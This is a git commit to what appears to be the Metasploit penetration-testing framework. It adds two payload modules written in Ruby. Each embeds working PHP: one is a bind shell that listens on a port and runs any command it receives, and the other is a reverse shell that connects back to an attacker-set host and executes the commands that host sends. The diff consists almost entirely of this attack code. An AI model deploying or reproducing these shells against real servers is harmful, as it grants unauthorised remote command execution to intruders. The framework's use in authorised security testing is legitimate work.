2bd17e31a8129e0c54cdfe1ef1e5ac0346cd74ad
HD Moore <hd_moore@rapid7.com>
2006-12-18 22:06:19 +0000

    new payloads from diaul
    git-svn-id: file:///home/svn/framework3/trunk@4220 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/php/bind_php.rb
@@ -0,0 +1,79 @@
+require 'msf/core'
+require 'msf/core/handler/bind_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Php
+
+module BindPhp
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'PHP Command Shell, Bind TCP (via php)',
+			'Version'       => '$Revision: 3636 $',
+			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
+			'Author'        => ['diaul <diaul@devilopers.org>',],
+			'License'       => BSD_LICENSE,
+			'Platform'      => 'php',
+			'Arch'          => ARCH_PHP,
+			'Handler'       => Msf::Handler::BindTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# PHP Bind Shell
+	#
+	def php_bind_shell
+		shell = <<-END_OF_PHP_CODE
+		<?php
+		error_reporting(E_ALL);
+	
+		set_time_limit(0);
+		ob_implicit_flush();
+
+		$address = '0.0.0.0';
+		$port = #{datastore['LPORT']};
+
+		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+		$ret = socket_bind($sock, $address, $port);
+		$ret = socket_listen($sock, 5);
+		$msgsock = socket_accept($sock);
+
+		while (true)
+		{
+			$command = socket_read($msgsock, 2048, PHP_NORMAL_READ);
+			$output = shell_exec(substr($command, 0, -1));
+			socket_write($msgsock, $output, strlen($output));
+		} 
+	
+		socket_close($sock);
+		?>
+		END_OF_PHP_CODE
+		
+		return shell
+
+	end
+
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + php_bind_shell
+	end
+	
+
+end
+
+end end end end
---
+++ modules/payloads/singles/php/reverse_php.rb
@@ -0,0 +1,73 @@
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Php
+
+module ReversePhp
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
+			'Version'       => '$Revision: 3636 $',
+			'Description'   => 'Reverse PHP connect back shell',
+			'Author'        => ['diaul <diaul@devilopers.org>',],
+			'License'       => BSD_LICENSE,
+			'Platform'      => 'php',
+			'Arch'          => ARCH_PHP,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# PHP Reverse Shell
+	#
+	def php_reverse_shell
+		shell = <<-END_OF_PHP_CODE
+		<?php
+		error_reporting(E_ALL);
+		$service_port = #{datastore['LPORT']};
+
+		$address = "#{datastore['LHOST']}";
+		$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+		$result = socket_connect($socket, $address, $service_port);
+
+		$command = '';
+
+		while ($command = socket_read($socket, 2048)) {
+        		$output = shell_exec(substr($command, 0, -1));
+        		socket_write($socket, $output, strlen($output));
+		}
+
+		socket_close($socket);
+		?>
+		END_OF_PHP_CODE
+		
+		return shell
+
+	end
+
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + php_reverse_shell
+	end
+	
+
+end
+
+end end end end
